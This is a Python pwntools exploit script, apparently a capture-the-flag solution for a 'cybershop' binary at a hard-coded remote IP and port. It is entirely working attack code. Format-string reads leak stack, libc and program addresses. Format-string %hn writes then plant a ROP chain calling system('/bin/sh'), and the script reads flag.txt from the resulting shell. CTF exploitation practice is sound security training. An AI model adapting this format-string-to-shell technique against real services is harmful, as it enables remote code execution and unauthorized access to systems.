#!/usr/bin/env python3

from pwn import *

PORT =  13333
HOST = "14.225.198.235"
exe = context.binary = ELF('./cybershop_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000001BA8
            c
            set follow-fork-mode parent
            ''')
        input()

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def change_name(payload):
    p.sendlineafter(b"> ", str(4).encode())
    p.sendlineafter(b"name: ", payload)

# Stage 1: Leak
fmt = b"%23$llx"
change_name(fmt)
stack_leak = int(p.recvline(), 16)  #rbp+0x18
stack_rip = stack_leak - 0x120
log.info("stack_rip: " + hex(stack_rip)) 

fmt = b"%21$llx"
change_name(fmt)
libc_leak = int(p.recvline(), 16)
log.info("libc_leak: " + hex(libc_leak))
libc.address = libc_leak - 0x2a1ca
log.info("libc_base: " + hex(libc.address))

fmt = b"%25$llx"
change_name(fmt)
exe_leak = int(p.recvline(), 16)
log.info("exe_leak: " + hex(exe_leak))
exe.address = exe_leak - 0x1b1a
log.info("exe_base: " + hex(exe.address))


# Stage 2: Getshell
# GDB()

pop_rdi = libc.address + 0x000000000010f78b
ret_gadget = libc.address + 0x000000000002882f
bin_sh = next(libc.search(b"/bin/sh"))
system_addr = libc.sym.system

def overwrite(address_val, target_stack_addr):
    for i in range(3):
        part = (address_val >> (16 * i)) & 0xffff

        current_target = target_stack_addr + (i * 2)

        fmt = f"%1${part}x%{8}$hn".encode()
        fmt = fmt.ljust(16, b'A')
        fmt += p64(current_target)

        change_name(fmt)

# 1. POP RDI; RET
overwrite(pop_rdi, stack_rip)

# 2. Address of "/bin/sh"
overwrite(bin_sh, stack_rip + 0x8)

# 3. RET
overwrite(ret_gadget, stack_rip + 0x10)

# 4. System
overwrite(system_addr, stack_rip + 0x18)

p.sendlineafter(b"> ", b"0")
p.sendline(b"cat flag.txt")

p.interactive()
